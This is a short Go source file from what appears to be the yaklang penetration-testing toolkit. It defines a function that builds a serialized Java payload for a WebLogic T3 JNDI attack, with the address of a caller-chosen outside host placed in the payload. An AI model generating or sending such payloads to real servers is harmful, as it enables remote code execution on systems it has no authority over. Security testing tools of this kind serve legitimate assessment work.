package t3

import (
	"bytes"
	"text/template"
	"yaklang.io/yaklang/common/utils"
	"yaklang.io/yaklang/common/yak/yaklib/codec"
	"yaklang.io/yaklang/common/yserx"
)

func GenerateWeblogicJNDIPayload(addr string) []byte {
	templ, _ := template.New(utils.RandStringBytes(5)).Parse(WeblogicJNDIPayload)
	tmpParams := map[string]interface{}{
		"raw":   codec.EncodeBase64(addr),
		"size":  len(addr),
		"value": addr,
	}
	var buf bytes.Buffer
	templ.Execute(&buf, tmpParams)
	ser, _ := yserx.FromJson(buf.Bytes())
	serx := yserx.MarshalJavaObjects(ser...)
	return serx
}
